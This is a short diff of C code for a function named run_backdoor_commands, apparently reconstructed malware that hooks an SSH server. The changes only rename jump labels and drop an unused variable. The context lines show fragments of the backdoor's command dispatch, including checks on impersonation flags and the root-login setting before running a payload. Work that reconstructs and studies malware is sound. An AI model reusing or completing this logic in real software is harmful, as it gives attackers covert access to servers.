@@ -250,12 +250,12 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 						if(cmd_type == 1){
 							if(!TEST_FLAG(f.kctx.args.flags2, CMDF_IMPERSONATE)
 							&& !ctx->sshd_ctx->permit_root_login_ptr) break;
-							goto j_monitor_req;
+							goto j_payload_main;
 						}
 						if(cmd_type != 3){
-							j_monitor_req:
+							j_payload_main:
 							offsets.value = 0;
-							goto payload_exec;
+							goto payload_main;
 						}
 						if((f.kctx.args.u.value[0] & 0x80) == 0
 						 && !ctx->sshd_ctx->permit_root_login_ptr) break;
@@ -264,7 +264,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 
 						if(!TEST_FLAG(f.kctx.args.flags3, 0x20)){
 							offsets.value = -1;
-							goto payload_exec;
+							goto payload_main;
 						}
 
 						u8 value;
@@ -315,7 +315,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 							have_offsets:
 							offsets.value = (tmp.value << 24) | v;
 
-							payload_exec:
+							payload_main:
 							ctx->sshd_offsets = offsets;
 
 							data_ptr2 = (u8 *)&f.kctx.payload + body_offset;
@@ -463,8 +463,6 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 									if(!ctx->libc_imports) break;
 									if(!ctx->libc_imports->pselect) break;
 									if(!ctx->libc_imports->__errno_location) break;
-
-									int write_idx = f.u.sock.socket_fd / 64;
 
 									int res;
 									for(;;){
